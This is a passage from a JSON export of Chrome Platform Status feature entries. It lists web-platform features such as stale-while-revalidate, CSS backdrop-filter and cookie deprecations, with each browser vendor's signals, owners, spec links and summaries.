        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "flag": false,
        "bug": "http://crbug.com/622895",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add OfflineAudioDestinationNode for an OfflineAudioContext.  This clarifies and distinguishes the destination for an offline context from an online (real-time) context.",
    "id": 5739682608447488,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/824",
        "https://github.com/WebAudio/web-audio-api/pull/856"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-25 22:53:12.273640",
      "by": "jfernandez@chromium.org"
    },
    "name": "overflow-wrap: break-spaces",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-text-3/#valdef-overflow-wrap-break-spaces",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1351432",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "jfernandez@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS",
          "Blink>Layout"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=767634",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=177327",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The overflow-wrap:break-spaces value allows authors to specify that any sequence of preserved white space that would otherwise overflow the line and hang as per Trimming and Positioning must be broken.",
    "id": 4842781306519552,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-04-25 00:27:34.227930",
      "by": "Patket@microsoft.com"
    },
    "name": "stale-while-revalidate",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://tools.ietf.org/html/rfc5861",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995651",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "No active development",
          "val": 1,
          "milestone_str": "No active development"
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "ricea@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=348877",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "stale-while-revalidate (s-w-r for short) is an HTTP header that defines an extra window of time during which a cache (proxy, user agents) can use a stale asset as long as it revalidates it asynchronously.\r\n\r\nThis improves subsequent page load latencies as stale assets are non longer in the critical path.",
    "id": 5050913014153216,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-07-04 04:03:51.327540",
      "by": "kojii@chromium.org"
    },
    "first_of_milestone": true,
    "name": "'left' and 'right' values for the 'text-underline-position' property",
    "comments": "Edge supports old syntax, no public signals to update.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-text-decor-3/#text-underline-position-property",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=770780",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "kojii@chromium.org",
          "ericwilligers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Fonts"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=313888",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=48936",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature adds support for 'left' and 'right' values for the 'text-underline-position' property. This property shipped in https://www.chromestatus.com/features/5766823203045376 but this part was left for the later work.",
    "id": 5749634488074240,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-29 12:43:35.177570",
      "by": "jfernandez@chromium.org"
    },
    "name": "'legacy\" CSS Value for the alignment behavior of HTML’s <center> element ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-align/#valdef-justify-items-legacy",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1363875",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "jfernandez@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=726148",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=172712",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSS Box Alignment spec defines a special syntax for the justify-items CSS property so that it's possible to implement the legacy alignment behavior of HTML’s <center> element and align attribute.\r\n\r\nIn order to declare an element to use this kind of alignment, a new CSS value has been defined: 'legacy'.",
    "id": 5751109557682176,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-04-25 00:29:12.415570",
      "by": "Patket@microsoft.com"
    },
    "name": "'noopener' should always disown the opener",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/html/issues/1826",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "lfg@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink>Bindings"
        ],
        "flag": false,
        "bug": "https://crbug.com/651661",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When targeting links with rel=noopener the opener should always be disowned. That means this:\r\n\r\n<a href='' target='foo'>Click me first</a>\r\n<a href='' target='foo' rel='noopener'>Click me second</a>\r\n\r\nwill open two different windows. The same behavior is expected when using window.open('', 'foo', 'noopener').",
    "id": 5641309343711232,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-09-23 09:03:06.777830",
      "by": "Patket@microsoft.com"
    },
    "name": "<meta http-equiv=\"set-cookie\" ...>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/pull/3011#issuecomment-331181807",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>Cookies"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=767813",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://mobile.twitter.com/patrickkettner/status/911282308337983489",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://mobile.twitter.com/johnwilander/status/911299622366150656",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "`<meta http-equiv=\"set-cookie\" ...>` provides a mechanism for manipulating a host's cookies via markup. Ideally, we would require access to a host's HTTP headers, or script-execution capabilities to modify this data.",
    "id": 6170540112871424,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/pull/3011#issuecomment-331187136"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-09-22 09:48:33.809730",
      "by": "beccahughes@chromium.org"
    },
    "name": "Activation Delegation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WICG/gesture-delegation",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "beccahughes@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=766090",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a allowedActivationDelegation attribute to <iframe> that allows the page to delegate user activation to child frames in certain contexts.",
    "id": 6025124331388928,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-12 19:59:30.204420",
      "by": "jmedley@google.com"
    },
    "name": "Add FullscreenOptions",
    "tags": [
      "fullscreen"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/829937",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds the ability to customize the requestFullscreen API with FullscreenOptions on Android. This allows developers to chose between making the navigation bar visible versus a completely immersive mode where no user agent controls are shown until a gesture is performed. \r\n\r\nSome webpages may prefer that the navigation bar is still visible when entering fullscreen mode as it can be difficult to determine how to exit fullscreen mode. Some browsers such as Samsung also make this the default.",
    "id": 5188650908254208,
    "resources": {
      "docs": [
        "https://github.com/dtapuska/fullscreen",
        "https://github.com/whatwg/fullscreen/issues/123"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-27 02:08:13.534720",
      "by": "ericbidelman@google.com"
    },
    "name": "Audio and video tracks",
    "comments": "This is done in WebKit, but still behind a runtime enabled feature last time I checked.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/embedded-content.html#audiotracklist-and-videotracklist-objects",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=744896",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "b.long@cablelabs.com",
          "self@brendanlong.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "flag": false,
        "bug": "http://code.google.com/p/chromium/issues/detail?id=249427",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh772592%28v=vs.85%29.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=122043",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This adds the ability to get information about multiple audio and video tracks, and switch between them using the AudioTrack.enabled and VideoTrack.selected attributes.",
    "id": 5748496434987008,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-27 02:09:29.492160",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Exclusions",
    "comments": "Rossen Atanassov from Microsoft is co-editor on the spec. IE shipped with a prefix. Apple removed the code saying it \"needs some evolution before the actual implementation happens\" http://trac.webkit.org/changeset/166618",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css-exclusions/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=674804",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "betravis@adobe.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "http://crbug.com/234749",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh673558",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Define areas inline content should avoid, and how inline content should wrap around them.",
    "id": 6296903092273152,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-09-17 08:10:32.040200",
      "by": "Patket@microsoft.com"
    },
    "name": "CSS Selector Pseudo class :dir()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/selectors-4/#the-dir-pseudo",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=562169",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=576815",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The :dir CSS pseudo-class matches elements based on the directionality of the text contained in it. Pseudo-class :dir() is not equivalent of using the [dir=…] attribute selector. The latter matches a value of the dir and doesn't match when no attribute is set, even if in that case the element inherits the value of its parent. On the other hand, :dir() will match the value calculated by the UA, being inherited or the auto value.",
    "id": 5751531651465216,
    "resources": {
      "samples": [
        "https://jsfiddle.net/fxc9a8uc/1/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-08-22 13:10:27.341970",
      "by": "fs@opera.com"
    },
    "name": "CSS backdrop-filter property",
    "tags": [
      "backdrop-filter",
      "css"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.fxtf.org/filters-2/#BackdropFilterProperty",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1178765",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "hendrikw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=520585",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/backdropfilter/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://www.webkit.org/blog/3632/introducing-backdrop-filters/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add backdrop-filter css property, which allows filters to be applied to the content behind an element.",
    "id": 5679432723333120,
    "resources": {
      "docs": [
        "https://drafts.fxtf.org/filters-2/#BackdropFilterProperty"
      ],
      "samples": [
        "http://jsbin.com/mokupo",
        "http://jsbin.com/deroqa",
        "http://output.jsbin.com/ninuva"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-27 02:08:53.275130",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS break-after, break-before and break-inside (Generic breaking control)",
    "comments": "Mozilla says:\r\n\r\nI think I'm ok with the stuff in the spec, although I'm a little worried about the processing model being a little too fluffy to be fully defined. (For example, is it clearly defined which blocks participate in the break decision at a block boundary where more than two blocks start or end, because of multiple nested blocks starting or ending? How does this interact with margin collapsing?) It would be nice if any issues found were raised and clarified in the spec before shipping",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-break-3/#breaking-controls",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mstensho@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=223068",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=148814",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for the modern fragmentainer break controlling properties break-after, break-before and break-inside. Currently, Blink only supports page-break-{after,before,inside} for printing and -webkit-column-break-{after,before,inside} for multicol.\r\n\r\nAdditionally, the current state of the foo-break-after and foo-break-before properties support in Blink is limited. Most importantly, there's no support for the \"avoid\" value.",
    "id": 5630943616303104,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-06 16:17:00.102402",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS logical flow relative values and box model properties",
    "tags": [
      "css-logical"
    ],
    "comments": "https://www.smashingmagazine.com/2018/03/understanding-logical-properties-values/",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-logical-1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1323940",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "obrufau@igalia.com",
          "rego@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://crbug.com/850004",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/7438435-css-logical-properties",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=185977",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Complete support for the following sections of CSS Logical Properties and Values spec:\r\n* 2. Flow-Relative Values: block-start, block-end, inline-start, inline-end\r\n* 4. Flow-Relative Box Model Properties (except 4.6 Four-Directional Shorthand Properties: the margin, padding, border-width, border-style, and border-color shorthands).\r\n",
    "id": 6237096230518784,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/docs/Web/CSS/CSS_Logical_Properties"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:34.199560",
      "by": "ericbidelman@google.com"
    },
    "name": "CSSTextEmphasisPosition: support for left and right values",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/css-text-decor-3/#text-emphasis-position",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "ramya.v@samsung.com"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=522882",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/162135",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for 'left' and 'right' values for CSSTextEmphasisPosition property.\r\n\r\nleft : Draw marks to the left of the text in vertical writing mode.\r\nright: Draw marks to the right of the text in vertical writing mode.",
    "id": 4988534620422144,
    "resources": {
      "docs": [
        "http://www.w3.org/TR/css-text-decor-3/#text-emphasis-position"
      ],
      "samples": [
        "http://jsfiddle.net/dstorey/wfANB/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:08.457570",
      "by": "ericbidelman@google.com"
    },
    "name": "Clear browsing context name on cross site navigation or history traversal",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/browsers.html#resetBCName",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "andypaicu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/706350",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7093/release-notes-for-safari-technology-preview-19/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Clear browsing context name on cross site navigation or history traversal",
    "id": 5929195548966912,
    "resources": {}
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-13 15:25:59.806050",
      "by": "ericbidelman@google.com"
    },
    "name": "Default Style for Custom Elements",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "kochi@chromium.org",
          "rakina@chromium.org",
          "jackalmage@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML>CustomElements"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=824684",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature will allow a default style for custom elements at the point of their registrations.\r\n\r\nThis will add a UA-stylesheet like capability to custom elements without the need to attach a shadow root and have a style sheet in each of its instances. ",
    "id": 5140940264046592,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-20 16:25:04.558866",
      "by": "csharrison@chromium.org"
    },
    "name": "Deprecate SpeechSynthesis.speak without user activation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/speech-api/webspeechapi.html#tts-section",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "csharrison@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>SpeechSynthesis"
        ],
        "flag": false,
        "bug": "https://crbug.com/812767",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This deprecation will cause speechSynthesis.speak to immediately fire an error if the document has not received user activation.",
    "id": 5687444770914304,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-06 12:44:06.624210",
      "by": "mkwst@chromium.org"
    },
    "name": "Deprecate nonsecurely delivered cookies.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/mikewest/cookies-over-http-bad/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!searchin/mozilla.dev.platform/cookie/mozilla.dev.platform/OrUOw3ag258/Te3rqqRLAgAJ",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Proposed",
          "val": 2,
          "milestone_str": "Proposed"
        },
        "owners": [
          "mkwst@chromium.org",
          "tnagel@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>Cookies"
        ],
        "flag": false,
        "bug": "https://crbug.com/749059",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
